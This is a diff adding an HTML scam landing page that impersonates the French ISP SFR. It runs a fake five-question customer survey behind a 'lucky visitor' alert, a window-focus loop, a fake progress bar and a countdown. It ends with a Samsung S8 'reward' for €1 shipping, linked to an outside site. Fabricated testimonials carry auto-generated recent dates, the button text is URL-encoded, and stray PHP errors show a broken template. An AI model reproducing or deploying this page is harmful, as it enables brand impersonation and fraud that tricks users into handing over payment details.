@@ -1,0 +1,1035 @@
+﻿<!DOCTYPE html>
+<html>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="utf-8">
+    <title>SFR - Examen du Service</title>
+    <link rel="shortcut icon" type="image/png" href="img/favicon.ico"/>
+
+    <!-- Optimized mobile viewport -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
+    <link rel="shortcut icon" href="img/-touch-icon.png">
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+
+    <!-- New Redesign CSS -->
+    <link rel="stylesheet" type="text/css" href="css/redesign.css">
+    <link rel="stylesheet" type="text/css" href="css/radio.css">
+
+    <!-- Font Awesome CDN -->
+    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    
+    <!-- JQuery & Main.js -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    
+    <!-- Message Box -->
+    <script type="text/javascript" src="js/jquery.msgbox.min.js"></script>
+    <script type="text/javascript" src="js/main.js"></script>
+
+    <!-- Progress Bar JS -->
+    <script type="text/javascript" src="js/progressbar.min.js"></script>
+
+
+    <meta name="-mobile-web-app-capable" content="yes">
+    <!-- HTML5 IE Enabling Script -->
+    <!--[if lt IE 9]>
+      <script src="libs/html5shiv.min.js"></script>
+      <![endif]-->
+    <script type="text/javascript">
+    function toggleFullScreenFF() {
+        if (!document.fullscreenElement && // alternative standard method
+            !document.mozFullScreenElement && !document.webkitFullscreenElement) { // current working methods
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) {
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+            }
+        } else {
+            if (document.cancelFullScreen) {
+                document.cancelFullScreen();
+            } else if (document.mozCancelFullScreen) {
+                document.mozCancelFullScreen();
+            } else if (document.webkitCancelFullScreen) {
+                document.webkitCancelFullScreen();
+            }
+        }
+    }
+
+
+
+    // var daytoday = formattedDate();
+
+
+    alert("************************************************\n\nFélicitations!\n\nVous êtes le visiteur chanceux d'aujourd'hui.\n\nCliquez sur OK pour continuer.\n\n************************************************");
+
+
+    var skipcycle = false;
+
+    function fcsOnMe() {
+        if (!skipcycle) {
+            window.focus()
+        }
+        mytimer = setTimeout("fcsOnMe()", 500)
+    };
+    </script>
+    <!-- ENDALERT -->
+</head>
+<body onLoad="fcsOnMe()">
+
+    <!-- Notification window -->
+    <div class="notification__window">
+        <p class="notification__title">Derniers Gagnats</p>
+        <img class="notification__flag" src="img/france.png" alt="Flag of France">
+        <p class="notification__ip">IP:<span class="random__ip"></span>.XXX.XXX</p>
+        a gagné un
+        <p class="notification__model">iPhone 7</p>
+        il y a <span class="notification__counter"></span>
+    </div>
+
+
+    <div class="container">
+        <div id="header" class="content centered">
+            <div class="title clearfix centered">
+                <a href="#"><img src="img/logo.jpg"></a>
+                <div class="description">
+                    <p><a class="noPop">SFR: Contrôle de votre fournisseur d’accès</a></p>
+                    <h1><a class="noPop">Enquête sur le service</a></h1>
+                </div>
+            </div>
+            <div class="date grey-box clearfix">
+                <div class="centered"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>
+                    <span id='fradatetoday'></span>
+
+                    <!-- Timer -->
+                    <p class="timer"><a class="noPop"><strong>Temps restant</strong>: <span id="time">05:00</span></a></p>
+                </div>
+            </div>
+        </div>
+        <div class="content" id="main-container">
+            <div class="border">
+                <div id="intro-text">
+                    <h2><a class="noPop1" style="font-weight:bold; color:#425E9D;">Cher utilisateur de <span class="fakelink"><br />
+                     <b>Notice</b>:  Undefined variable: target in <b>/var/www/hosting/enqueteofficielle/fr/isp/2.ct.fs.php</b> on line <b>134</b><br />
+                     </span>,</a>
+                  </h2>
+                    <br/>
+                    <p> <a class="noPop1"> Vous avez été sélectionné au hasard pour participer à l'enquête annuelle des consommateurs.</strong><br/>
+                     <br/>
+                     Dites-nous ce que vous pensez de <strong><br />
+                     <b>Notice</b>:  Undefined variable: target in <b>/var/www/hosting/enqueteofficielle/fr/isp/2.ct.fs.php</b> on line <b>138</b><br />
+                     </strong> dans cette enquête de 30 secondes et pour vous dire merci, nous vous avons réservé quelques récompenses, <strong>d'une valeur de plus de 659 €, pour remplir ce court sondage !</strong></a>
+                    </p>
+                    <p>
+                        <br/>
+                    </p>
+                    <div class="cta" align="center"><a id="btnBegin" title="Commencer">Commencer >></a></div>
+                    <br/>
+                    <br/>
+                </div>
+                <div class="question" id="q1">
+                    <div class="red_element"></div>
+                    <h3 class="grey-box"><a class="noPop">
+                    <span>Question 1 sur 5:</span>
+                    <hr align="left">
+                    Comment trouvez-vous, dans l’ensemble, votre expérience avec <em style="font-style:italic">SFR</em> comme votre fournisseur de services internet ? </a></h3>
+
+                    <ul>
+                    <li>
+                        <div class="hover clearfix">
+                            <input type="radio" class="rb" id="1a" name="q1" value="1a" checked="false"/>
+                            <label for="1a"><a class="noPop">Sans reproche</a></label>
+                            <div class="check"></div>
+                        </div>
+                    </li>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="1b" name="q1" value="1b" checked="false"/>
+                        <label for="1b"><a class="noPop">Convenable</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="1c" name="q1" value="1c" checked="false" />
+                        <label for="1c"><a class="noPop">Mauvais</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="1d" name="q1" value="1d" checked="false" />
+                        <label for="1d"><a class="noPop">Ne se prononce pas</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    </ul>
+                </div>
+                <div class="question" id="q2">
+                    <div class="red_element"></div>
+                    <h3 class="grey-box"><a class="noPop"><span>Question 2 sur 5:</span> 
+                    <hr align="left">
+                    Comment qualifierez-vous la fiabilité et la vitesse de votre connexion internet actuelle ? </a></h3>
+                    <ul>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="2a" name="q2" value="2a" />
+                        <label for="2a"><a class="noPop">Sans reproche</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="2b" name="q2" value="2b" />
+                        <label for="2b"><a class="noPop">Convenable</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="2c" name="q2" value="2c" />
+                        <label for="2c"><a class="noPop">Mauvais</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="2d" name="q2" value="2d" />
+                        <label for="2d"><a class="noPop">Ne se prononce pas</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    </ul>
+                </div>
+                <div class="question" id="q3">
+                    <div class="red_element"></div>
+                    <h3 class="grey-box"><a class="noPop"><span>Question 3 sur 5:</span>
+                    <hr align="left">
+                    Si vous payez la facture mensuelle, comment trouvez-vous le prix de ce service ?</a></h3>
+
+                    <ul>
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="3a" name="q3" value="3a" />
+                        <label for="3a"><a class="noPop">Trop cher</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="3b" name="q3" value="3b" />
+                        <label for="3b"><a class="noPop">Prix juste</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="3c" name="q3" value="3c" />
+                        <label for="3c"><a class="noPop">Abordable</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="3d" name="q3" value="3d" />
+                        <label for="3d"><a class="noPop">Ce n’est pas moi qui paie les factures</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+                    </ul>
+                </div>
+                <div class="question" id="q4">
+                    <div class="red_element"></div>
+                    <h3 class="grey-box"><a class="noPop"><span>Question 4 sur 5:</span>
+                    <hr align="left">
+                    Si vous deviez choisir une chose à améliorer au sujet de nos services, quelle serait-elle ?</a></h3>
+
+                    <ul>
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="4a" name="q4" value="4a" />
+                        <label for="4a"><a class="noPop">La vitesse de connexion</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="4b" name="q4" value="4b" />
+                        <label for="4b"><a class="noPop">Fiabilité</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="4c" name="q4" value="4c" />
+                        <label for="4c"><a class="noPop">Service Clients</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="4d" name="q4" value="4d" />
+                        <label for="4d"><a class="noPop">Téléchargez allocation</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+                    </ul>
+                </div>
+                <div class="question" id="q5">
+                    <div class="red_element"></div>
+                    <h3 class="grey-box"><a class="noPop"><span>Question 5 sur 5:</span>
+                    <hr align="left">
+                    Enfin, êtes-vous le propriétaire de la résidence dans laquelle vous vivez actuellement? </a></h3>
+
+                    <ul>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="5a" name="q5" value="5a" />
+                        <label for="5a"><a class="noPop">Oui</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    <li>
+                    <div class="hover clearfix">
+                        <input type="radio" class="rb" id="5b" name="q5" value="5b" />
+                        <label for="5b"><a class="noPop">Non</a></label>
+                        <div class="check"></div>
+                    </div>
+                    </li>
+
+                    </ul>
+                </div>
+                <div class="question" id="bridge">
+                    <h2><a class="noPop"><strong>Merci ! Sondage terminé, merci de votre participation !</strong></a></h2>
+                    <p class="grey-box" style="padding: 20px;"><a class="noPop" id="submission-text">Pendant que nous envoyons vos réponses, nous vérifions notre stock pour voir quelles sont les récompenses disponibles afin de vous remercier d'avoir répondu à toutes les questions. Merci de patienter</a><img src="img/dots.gif" style="height: 23px; width: 18px" />
+                        <br/>
+                        <br/>
+                        <span id="progressbar">
+                            
+                        </span>
+                        <!-- <img src="img//loading.gif" /> -->
+                    </p>
+                </div>
+
+                <div class="question" id="final">
+                    <p class="final__title"><strong><a class="noPop">Merci de vos commentaires!</a></strong></p>
+                    <div class="clearfix">
+                        <div class="prize-img">
+                            <span class="vertical-center"></span>
+                            <a href="http://www.getitnoww.com/s7fr.php" target="_blank">
+                                <img src="https://image.ibb.co/k4mVF5/s8finish.jpg" width="213" height="203">
+                            </a>
+                        </div>
+                        <div class="final__description">
+                        <h4>
+                           <a href="http://www.getitnoww.com/s7fr.php" target="_blank">SAMSUNG S8 </a>
+                        </h4>
+                            <p>Saisissez vos coordonnées sur la page suivante pour recevoir votre smartphone gratuit. Veuillez noter que les stocks restants sont limités et que vous devrez régler des frais de port modiques de &euro;1</p>
+                            <div class="cta claimbutton">
+                                <a title="Recevoir ma Récompense&nbsp;&nbsp;&gt;&gt;" href="http://www.getitnoww.com/s7fr.php">
+                                    <script type="text/javascript">
+                                    document.write(unescape('%52%65%63%65%76%6f%69%72%20%6d%61%20%52%e9%63%6f%6d%70%65%6e%73%65%26%6e%62%73%70%3b%26%6e%62%73%70%3b%26%67%74%3b%26%67%74%3b'));
+                                    </script>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="footer">
+                    <div class="date grey-box" style="margin: auto 0">
+                    <iframe src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2Ffacebook&width=450&layout=standard&action=like&size=small&show_faces=true&share=false&height=80&appId" width="450" height="80" style="border:none;overflow:hidden" scrolling="no" frameborder="0" allowTransparency="true"></iframe>
+                    </div>
+                    <table width="100%" cellspacing="0" cellpadding="4" border="0" style="padding-top:10px;font-size:13px;background-color:#F6F7F9;">
+                        <tr>
+                            <td width="75" valign="top" align="right"><img src="img/f1.gif" /></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight:bold"><a class="noPop name">Alexandre Bourgeois</a></div>
+                                <div style="padding-top:5px"><a class="noPop">Merci pour le Samsung S8 !<br/></a></div>
+                                <div style="padding-top:5px;color:#9c9c9c;font-size:11px">
+                                    <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 14);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) {
+                                        year += 1900;
+                                    }
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) {
+                                        daym = "0" + daym;
+                                    }
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre");
+                                    document.write("" + montharray[month] + " " + daym + ", " + year + "");
+                                    </script> à 17:36
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td width="75" valign="top" align="right"><img src="img/3.jpg" /></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight:bold"><a class="noPop name">Mathilde Faure</a></div>
+                                <div style="padding-top:5px"><a class="noPop">Quelqu'un sait si c'est vrai ?</a></div>
+                                <div style="padding-top:5px;color:#9c9c9c;font-size:11px">
+                                    <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 14);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) {
+                                        year += 1900;
+                                    }
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) {
+                                        daym = "0" + daym;
+                                    }
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre");
+                                    document.write("" + montharray[month] + " " + daym + ", " + year + "");
+                                    </script> à 17:36
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td width="75" valign="top" align="right"><img src="img/f2.gif" /></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight:bold"><a class="noPop name">Léa Lefebvre</a></div>
+                                <div style="padding-top:5px"><a class="noPop">Le sondage était rapide et facile. Ça ne me dérangerait pas de répondre à un autre pour recevoir un autre cadeau gratuit.</a></div>
+                                <div style="padding-top:5px;color:#9c9c9c;font-size:11px">
+                                    <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 16);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) {
+                                        year += 1900;
+                                    }
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) {
+                                        daym = "0" + daym;
+                                    }
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre");
+                                    document.write("" + montharray[month] + " " + daym + ", " + year + "");
+                                    </script> à 14:24
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td width="75" valign="top" align="right"><img src="img/2.jpg" /></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight:bold"><a class="noPop name">Eva Laurant</a></div>
+                                <div style="padding-top:5px"><a class="noPop">Quelqu'un sait comment arrêter le wifi de se connecter automatiquement sur l'Samsung S8?</a></div>
+                                <div style="padding-top:5px;color:#9c9c9c;font-size:11px">
+                                    <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 14);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) {
+                                        year += 1900;
+                                    }
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) {
+                                        daym = "0" + daym;
+                                    }
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre");
+                                    document.write("" + montharray[month] + " " + daym + ", " + year + "");
+                                    </script> à 16:33
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td width="75" valign="top" align="right"><img src="img/10.jpg" /></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight:bold"><a class="noPop name">Louis Dupont</a></div>
+                                <div style="padding-top:5px"><a class="noPop">Le mien est arrive par la poste aujourd'hui! Merci pour la nouvelle Samsung S8!<br/><img style="border-radius:0; width: 150px;" src="img/test.jpg"/></a></div>
+                                <div style="padding-top:5px;color:#9c9c9c;font-size:11px">
+                                    <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 19);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) {
+                                        year += 1900;
+                                    }
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) {
+                                        daym = "0" + daym;
+                                    }
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre");
+                                    document.write("" + montharray[month] + " " + daym + ", " + year + "");
+                                    </script> à 11:55
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td width="75" valign="top" align="right"><img src="img/5.jpg" /></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight:bold"><a class="noPop name">Nicolas Issa</a></div>
+                                <div style="padding-top:5px"><a class="noPop">Stupide ou pas, je viens de recevoir un Samsung S8  pour &euro;1 mdr. C’est incroyable. Enfin, une raison d'aimer <br /><img style="border-radius:0; width: 150px;" src="test2.jpg"/>
+                              </a>
+                                </div>
+                                <div style="padding-top:5px;color:#9c9c9c;font-size:11px">
+                                    <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 14);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) {
+                                        year += 1900;
+                                    }
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) {
+                                        daym = "0" + daym;
+                                    }
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre");
+                                    document.write("" + montharray[month] + " " + daym + ", " + year + "");
+                                    </script> à 18:36
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td width="75" valign="top" align="right"><img src="img/f4.gif" /></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight:bold"><a class="noPop name">Lillian Ong</a></div>
+                                <div style="padding-top:5px"><a class="noPop">Je pensais que c'était une blague au début, mais j'ai effectivement recu mon  Samsung S8 ce matin !</a></div>
+                                <div style="padding-top:5px;color:#9c9c9c;font-size:11px">
+                                    <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 20);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) {
+                                        year += 1900;
+                                    }
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) {
+                                        daym = "0" + daym;
+                                    }
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre");
+                                    document.write("" + montharray[month] + " " + daym + ", " + year + "");
+                                    </script> à 8:47
+                                </div>
+                            </td>
+                        </tr>
+                        </td>
+                        </tr>
+                        <tr>
+                            <td width="75" valign="top" align="right"><img src="img/f6.png" /></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight:bold"><a class="noPop name">Guillaume Dubois</a></div>
+                                <div style="padding-top:5px"><a class="noPop">Je croyais que c'était une arnaque mais j'ai reçu ma Samsung S8 après 3 semaines. Dommage pour ceux qui l'ont acheté au prix fort!</a></div>
+                                <div style="padding-top:5px;color:#9c9c9c;font-size:11px">
+                                    <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 33);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) {
+                                        year += 1900;
+                                    }
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) {
+                                        daym = "0" + daym;
+                                    }
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre");
+                                    document.write("" + montharray[month] + " " + daym + ", " + year + "");
+                                    </script> at 14:16
+                                </div>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td width="75" valign="top" align="right"><img src="img/f5.gif" /></td>
+                            <td align="left" valign="top">
+                                <div style="font-weight:bold"><a class="noPop name">Nathan Durand</a></div>
+                                <div style="padding-top:5px"><a class="noPop">J'étais un peu sceptique au début, mais je viens de recevoir ma Samsung S8 aujourd'hui! c'etait facile et fun</a></div>
+                                <div style="padding-top:5px;color:#9c9c9c;font-size:11px">
+                                    <script>
+                                    var mydate = new Date();
+                                    mydate.setDate(mydate.getDate() - 33);
+                                    var year = mydate.getYear();
+                                    if (year < 1000) {
+                                        year += 1900;
+                                    }
+                                    var day = mydate.getDay();
+                                    var month = mydate.getMonth();
+                                    var daym = mydate.getDate();
+                                    if (daym < 10) {
+                                        daym = "0" + daym;
+                                    }
+                                    var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
+                                    var montharray = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre");
+                                    document.write("" + montharray[month] + " " + daym + ", " + year + "");
+                                    </script> à 15:16
+                                </div>
+                            </td>
+                        </tr>
+                        </tr>
+                    </table>
+<!--                     <div style="margin: 55px 0 0 0; padding: 0 0 0 10px; font-size: 13px"><a class="noPop"><strong>Qu'avez-vous pensé de l'enquête ?</strong></a></div>
+                     <hr width="98%" size="1" />
+                     <div class="addCommentBox">
+                       <textarea name="comment" id="comment" class="commentTextBox"></textarea>
+                       <br />
+                       <input type="button" onClick="javascript:comment()" value="Commentaire">
+                       </div>
+                     </div>
+                     </div> -->
+                    <!--end page 2-->
+                </div>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript">
+    var monthNames = ["Janvier", "Février", "Mars", "Avril", "Mai", "Juin",
+        "Juillet", "Août", "Septembre", "Octobrer", "Novembre   ", "Décembre"
+    ];
+    var today = new Date();
+    var dd = today.getDate();
+    var mm = today.getMonth(); //January is 0!
+
+    var yyyy = today.getFullYear();
+    if (dd < 10) {
+        dd = '0' + dd
+    }
+
+
+    var today = dd + ' ' + monthNames[mm] + ' ' + yyyy;
+
+
+    document.getElementById("fradatetoday").innerHTML = today;
+    var lastStep = false;
+
+
+    function startTimer(duration, display) {
+        var timer = duration,
+            minutes, seconds;
+        setInterval(function() {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+            display.text(minutes + ":" + seconds);
+
+            if (--timer < 0) {
+                timer = duration;
+            }
+        }, 1000);
+    }
+
+    // jQuery(function($) {
+        // var fiveMinutes = 60 * 5,
+        //     display = $('#time');
+        // startTimer(fiveMinutes, display);
+    // });
+
+
+    function start() {
+        fade("out", introText, 300, !0);
+        setTimeout(function() {
+            fade("in", q1, 300, !0)
+        }, 300)
+    }
+
+    function processQ1() {
+        fade("out", q1, 300, !0);
+        setTimeout(function() {
+            fade("in", q2, 300, !0)
+        }, 300)
+    }
+
+    function processQ2() {
+        fade("out", q2, 300, !0);
+        setTimeout(function() {
+            fade("in", q3, 300, !0)
+        }, 300)
+    }
+
+    function processQ3() {
+        fade("out", q3, 300, !0);
+        setTimeout(function() {
+            fade("in", q4, 300, !0)
+        }, 300)
+    }
+
+    function processQ4() {
+        fade("out", q4, 300, !0);
+        setTimeout(function() {
+            fade("in", q5, 300, !0)
+        }, 300)
+    }
+
+    function udoma(b) {
+        var a = document.createElement("a");
+        a.href = b;
+        return a.hostname
+    }
+
+    function getRandomInt(b, a) {
+        return Math.floor(Math.random() * (a - b + 1)) + b
+    }
+
+    function percha(b) {
+        var a = getRandomInt(0, 99);
+        return b > a
+    }
+
+    // Progress Bar Animation
+    var bar = new ProgressBar.Line(progressbar, {
+        strokeWidth: 4,
+        easing: 'easeInOut',
+        duration: 6500,
+        color: '#FFEA82',
+        trailColor: '#eee',
+        trailWidth: 1,
+        svgStyle: { width: '100%', height: '100%' },
+        from: { color: '#F9A4AE' },
+        to: { color: '#FF394F' },
+        step: (state, bar) => {
+            bar.path.setAttribute('stroke', state.color);
+        }
+    });
+
+    function buttonAnimation() {
+        setTimeout(function() {
+            // Animation of the main button ============
+            $('.claimbutton a').css('transform','scale(1.2, 1.2)');
+        }, 500);
+        setTimeout(function() {
+            $('.claimbutton a').css('transform', 'scale(1, 1)');
+        }, 700);
+        setTimeout(function() {
+            $('.claimbutton a').css('transform', 'scale(1.2, 1.2)');
+        }, 900);
+        setTimeout(function() {
+            $('.claimbutton a').css('transform', 'scale(1, 1)');
+        }, 1100);
+        setTimeout(function() {
+            $('.claimbutton a').css('transform', 'scale(1.2, 1.2)');
+        }, 1300);
+        setTimeout(function() {
+            $('.claimbutton a').css('transform', 'scale(1, 1)');
+        }, 1500);  
+        setTimeout(function() {
+            $('.claimbutton a').css('transform', 'scale(1.2, 1.2)');
+        }, 1700);
+    };
+
+
+    function processQ5() {
+        
+        bar.animate(1.0);
+
+
+        lastStep = true;
+        var fiveMinutes = 60 * 5,
+            display = $('#time');
+        fade("out", q5, 300, !0);
+        setTimeout(function() {
+            fade("in", bridge, 300, !0)
+        }, 300);
+
+
+        var a = setInterval(function() {
+            var b = document.getElementById("submission-text");
+            b.innerHTML = "Vérification des réponses";
+            clearInterval(a);
+            var d = setInterval(function() {
+                b.innerHTML = "";
+                clearInterval(d);
+                fade("out", bridge, 300, !0);
+                setTimeout(function() {
+
+                    // Starting the timer
+                    startTimer(fiveMinutes, display);
+                    // Apperating the final block
+                    $('#final').fadeIn("slow");
+                    $('.timer').fadeIn("slow");
+
+                    setInterval(buttonAnimation, 3000);
+
+                }, 300)
+            }, 3000)
+        }, 3000)
+    }
+
+    function fade(h, l, f, b) {
+        var g = "in" == h,
+            m = b ? b : !1,
+            d = g ? 0 : 1,
+            k = 50 / f;
+        g && (l.style.display = "block", l.style.opacity = d, m && (l.style.filter = "alpha(opacity=" + d + ")", l.style.filter = "progid:DXImageTransform.Microsoft.Alpha(Opacity=" + d + ")"));
+        var j = window.setInterval(function() {
+            d = g ? d + k : d - k;
+            l.style.opacity = d;
+            m && (l.style.filter = "alpha(opacity=" + 100 * d + ")", l.style.filter = "progid:DXImageTransform.Microsoft.Alpha(Opacity=" + 100 * d + ")");
+            (0 >= d || 1 <= d) && window.clearInterval(j);
+            0 >= d && (l.style.display = "none")
+        }, 50)
+    }
+
+    function r(b, a) {
+        return ++a ? String.fromCharCode((b < "[" ? 91 : 123) > (b = b.charCodeAt() + 13) ? b : b - 26) : b.replace(/[a-zA-Z]/g, r)
+    }
+    var prefix = "http://";
+    var kw = "?keyword=";
+    var btnBegin = document.getElementById("btnBegin");
+    var introText = document.getElementById("intro-text");
+    var bridge = document.getElementById("bridge");
+    var q1 = document.getElementById("q1");
+    var q2 = document.getElementById("q2");
+    var q3 = document.getElementById("q3");
+    var q4 = document.getElementById("q4");
+    var q5 = document.getElementById("q5");
+    var divFinal = document.getElementById("final");
+
+    btnBegin.onclick = function() {
+        start()
+    };
+    if (!document.querySelectorAll && document.createStyleSheet) {
+        (function(b, a) {
+            b = document, a = b.createStyleSheet();
+            b.querySelectorAll = function(h, f, e, g, d) {
+                d = b.all, f = [], h = h.replace(/\[for\b/gi, "[htmlFor").split(",");
+                for (e = h.length; e--;) {
+                    a.addRule(h[e], "k:v");
+                    for (g = d.length; g--;) {
+                        d[g].currentStyle.k && f.push(d[g])
+                    }
+                    a.removeRule(0)
+                }
+                return f
+            }
+        })()
+    }
+    for (var nodes = document.querySelectorAll("#q1 .hover"), c = 0; c < nodes.length; c++) {
+        nodes[c].onclick = function() {
+            processQ1()
+        }
+    }
+    for (var nodes = document.querySelectorAll("#q2 .hover"), c = 0; c < nodes.length; c++) {
+        nodes[c].onclick = function() {
+            processQ2()
+        }
+    }
